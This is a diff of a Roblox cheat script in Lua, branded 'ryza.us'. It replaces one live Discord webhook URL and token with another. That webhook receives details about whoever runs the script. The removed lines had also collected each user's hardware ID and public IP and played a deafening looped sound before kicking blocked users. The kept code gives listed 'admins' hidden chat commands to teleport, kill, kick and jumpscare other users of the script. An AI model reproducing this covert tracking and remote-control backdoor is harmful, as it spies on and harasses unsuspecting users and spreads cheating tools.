@@ -28,7 +28,7 @@ end
 
 local akAdminKey = fetchKey()
 
-local webhookURL = "https://discord.com/api/webhooks/1360363792797667439/HyzcHgo-2IahecC2GR1lYgrJ75j_boNpch1R36Q61te9SIERh8wIuKe26Ajh_rfUOg1f"
+local webhookURL = "https://discord.com/api/webhooks/1369704218427916441/pbRVETiN52StSSSHwHT6LIiNYgDAGXE5sb-KMEgd_FK6VVoUjg4Q6-NzWlUJLgqGpO6u"
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 task.wait(0.2)
 local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
@@ -63,20 +63,6 @@ else
 	executorInfo = "Safety Unknown"
 end
 
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-local IP = game:HttpGet("https://v4.ident.me/")
-
-if HWID == "null" then
-	local s = Instance.new("Sound")
-	s.Parent = LocalPlayer.PlayerGui
-	s.SoundId = "rbxassetid://17518855592"
-	s.Volume = 1000
-	s.Looped = true
-	s:Play()
-	task.wait(5)
-	LocalPlayer:Kick("The associated discord account (1330566596975923223) is not permitted to use this script.\nAppeal: https://discord.gg/XRqjm6Nk4K")
-end
-
 local data = {
 	content = "",
 	embeds = {{
@@ -90,8 +76,6 @@ local data = {
 			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
 			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
 			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
-			{ name = "**User Key**", value = HWID, inline = true },
-			{ name = "**IP Address**", value = IP, inline = true },
 			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
 		},
 		footer = {
@@ -2488,11 +2472,7 @@ do
 		"WealthyZeno"
 	}
 
-	local adminsByHWID = {
-		
-	}
-
-	if findList(admins, LocalPlayer.Name) or findList(adminsByHWID, HWID) then
+	if findList(admins, LocalPlayer.Name) then
 		Tabs.Admin:AddButton({
 			Title = "Bring All",
 			Description = "Bring all script user(s)",
@@ -2545,7 +2525,7 @@ do
 	local function onPlayerAdded(player)
 		player.Chatted:Connect(function(message)
 			if message == "ryza.us(bring)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
@@ -2561,7 +2541,7 @@ do
 					end
 				end
 			elseif message == "ryza.us(kill)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
@@ -2575,7 +2555,7 @@ do
 					char.Humanoid.Health = 0
 				end
 			elseif message == "ryza.us(kick)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
@@ -2585,7 +2565,7 @@ do
 
 				LocalPlayer:Kick("kicked by ryza.us administrator")
 			elseif message == "ryza.us(send)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
@@ -2728,7 +2708,7 @@ do
 
 				end)
 			elseif message == "ryza.us(jumpscare)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
@@ -2754,7 +2734,7 @@ do
 				task.wait(5)
 				sGui:Destroy()
 			elseif message == "ryza.us(flashbang)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
+				if not findList(admins, player.Name) then
 					return
 				end
 
